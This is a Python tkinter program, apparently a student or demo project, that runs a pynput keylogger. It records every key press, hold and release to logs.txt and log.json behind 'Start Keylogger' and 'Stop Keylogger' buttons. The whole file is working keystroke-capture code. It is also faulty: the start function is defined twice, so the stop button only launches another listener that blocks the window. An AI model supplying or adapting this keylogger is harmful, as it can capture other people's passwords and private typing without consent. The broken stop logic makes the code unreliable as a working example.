import tkinter as tk
from tkinter import *
from pynput import keyboard
import json

# Create the main window
root = tk.Tk()
root.geometry("400x350")
root.title("Keylogger Project")
root.configure(bg="#3F2E3E")
root.eval('tk::PlaceWindow . center')
root.resizable(False,False)

# List to store the captured key events
key_list = []
x = False
key_strokes = ""

# Function to update the text file with key strokes
def update_txt_file(key):
    with open('logs.txt', 'w+') as key_stroke:
        key_stroke.write(key)

# Function to update the JSON file with key events
def update_json_file(key_list):
    with open('log.json', 'w+') as key_log:
        key_list_bytes = json.dumps(key_list).encode()
        key_log.write(key_list_bytes.decode())

# Function called when a key is pressed
def on_press(key):
    global x, key_list
    if x == False:
        key_list.append({'Pressed': f'{key}'})
        x = True
    if x == True:
        key_list.append({'Held': f'{key}'})
    update_json_file(key_list)

# Function called when a key is released
def on_release(key):
    global x, key_list, key_strokes
    key_list.append({'Released': f'{key}'})
    if x == True:
        x = False
    update_json_file(key_list)

    key_strokes = key_strokes + str(key)
    update_txt_file(str(key_strokes))

# Function to start the keylogger
def butaction():
    print("[+] Running Keylogger Successfully!\n[!] Saving the key logs in 'log.json'")
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
#Function to stop the keylogger
def butaction():
    print("[+] Running Keylogger Successfully!\n[!] Stoping the key logs in 'logs.json'")
    with keyboard.Listener (on_press=on_press,on_release=on_release) as listener:
        listener.join()

# GUI elements
empty = Label(root, text="", bg="#3F2E3E").grid(row=0, column=1)
empty = Label(root, text="PROJECT", font='Georgia 20 bold',fg="white", bg="#3F2E3E").grid(row=1, column=1)
empty = Label(root, text="", bg="#3F2E3E").grid(row=2, column=1)
empty = Label(root, text="KEYLOGGER",fg="white",font='Georgia 20 bold underline', bg="#3F2E3E").grid(row=3, column=1)
empty = Label(root, text="", bg="#3F2E3E").grid(row=4, column=1)
empty = Label(root, text="Keyloggers are activity-monitoring software programs",fg="white", font='Arial 13', bg="#3F2E3E").grid(row=6, column=1)
empty = Label(root, text="that give hackers access to your personal data.",fg="white", font='Arial 13', bg="#3F2E3E").grid(row=7, column=1)
empty = Label(root, text="", bg="#3F2E3E").grid(row=8, column=1)
empty = Label(root, text="Click here to begin",fg="white", font='Arial 10', bg="#3F2E3E").grid(row=9, column=1)
Button(root, text="Start Keylogger", command=butaction, bg="white", fg="black", font='Arial 12 bold').grid(row=10, column=1)
empty = Label(root, text="Click here to end",fg="white", font='Arial 10', bg="#3F2E3E").grid(row=11, column=1)
Button(root, text="Stop Keylogger", command=butaction, bg="white", fg="black", font='Arial 12 bold').grid(row=12,column=1)

# Start the GUI event loop
root.mainloop()
